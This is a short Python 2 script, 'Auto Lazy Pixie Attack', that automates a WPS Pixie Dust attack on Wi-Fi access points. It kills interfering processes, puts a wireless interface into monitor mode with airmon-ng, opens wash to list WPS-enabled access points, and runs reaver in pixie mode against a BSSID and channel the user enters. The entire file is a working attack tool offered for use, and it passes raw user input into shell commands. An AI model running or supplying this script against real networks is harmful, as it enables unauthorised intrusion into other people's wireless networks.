import os

os.system('clear')

print """
Auto Lazy Pixie Attack
Script to automate WPS Pixie attack
Bluedangerforyou
"""
interface = raw_input("Enter interface -example: wlan0 >> ")

print '...running kill check on interface...'
os.system('airmon-ng check kill')
print '...putting ' + interface + ' into monitor mode...'
os.system('airmon-ng start ' + interface)
print 'A new terminal is opening. Pick a WPS enabled AP'
BSSID = raw_input("What is the BSSID?>> ")
channel = raw_input("What channel is AP?>> ")
os.system("xterm -hold -e 'wash -i " + interface + "mon' & ")
print 'Running reaver attack...'
os.system('reaver -i ' + interface + 'mon -b ' + BSSID + ' -c ' + channel + ' -vvv -k 1 -f')

